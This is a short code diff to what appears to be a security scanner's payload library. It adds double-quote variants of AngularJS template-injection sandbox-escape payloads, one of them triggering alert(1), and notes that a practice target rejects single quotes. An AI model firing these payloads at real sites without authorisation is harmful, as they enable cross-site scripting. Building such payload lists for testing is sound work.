@@ -175,6 +175,17 @@ PAYLOAD_LIBRARY = {
         # More sandbox bypasses for different Angular versions
         "{{$eval.constructor('return 7*7')()}}",
         "{{$parse.constructor('return 7*7')()}}",
+        # ------------------------------------------------------------
+        # DOUBLE-QUOTE VARIANTS (for servers that error on single quotes)
+        # ginandjuice.shop returns 500 on single quotes, but accepts double quotes
+        # ------------------------------------------------------------
+        '{{constructor.constructor("return 7*7")()}}',
+        '{{constructor.constructor("alert(1)")()}}',
+        '{{$on.constructor("return 7*7")()}}',
+        '{{[].pop.constructor("return 7*7")()}}',
+        '{{[].push.constructor("return 7*7")()}}',
+        '{{$eval.constructor("return 7*7")()}}',
+        '{{$parse.constructor("return 7*7")()}}',
     ],
 
     # ================================================================
